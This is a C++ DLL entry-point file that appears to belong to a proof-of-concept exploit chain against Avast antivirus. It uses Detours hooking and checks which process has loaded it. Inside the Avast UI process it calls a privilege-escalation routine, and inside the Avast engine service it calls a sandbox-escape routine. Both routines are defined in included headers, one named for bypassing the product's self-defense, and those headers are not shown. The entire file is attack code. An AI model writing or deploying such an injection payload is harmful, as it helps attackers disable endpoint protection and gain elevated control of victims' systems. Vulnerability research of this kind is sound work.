// dllmain.cpp : Defines the entry point for the DLL application.
#include <Windows.h>
#include "detours.h"
#include "SelfDefenseBypass.h"
#include "SandboxScheduleSystemAmPplProcessExploit.h"
#include "wil/stl.h"
#include "wil/win32_helpers.h"

BOOL APIENTRY DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(lpvReserved);

    if (DetourIsHelperProcess())
        return TRUE;

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
    {
        try
        {
            static_cast<void>(DetourRestoreAfterWith());
            static_cast<void>(::DisableThreadLibraryCalls(hinstDLL));

            auto mainModuleFilePath = wil::GetModuleFileNameW<std::wstring>(NULL);

            if (::_wcsicmp(mainModuleFilePath.c_str(), AvastUiExeFilePath) == 0)
            {
                if (!DelayedExecute(&EscalatePrivileges, &g_originalEntryPoint))
                    // Sometimes DetourAttach() fails with ERROR_INVALID_BLOCK 
                    // because entry function was too small to be detoured. 
                    // Then try to execute immediately under loader lock
                    EscalatePrivileges();
            }
            else if (::_wcsicmp(mainModuleFilePath.c_str(), AswEngSrvExeFilePath) == 0)
                EscapeSandbox();
        }
        catch (const std::exception &e)
        {
            // ToDo: Log error
            UNREFERENCED_PARAMETER(e);
            __debugbreak();
        }

        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
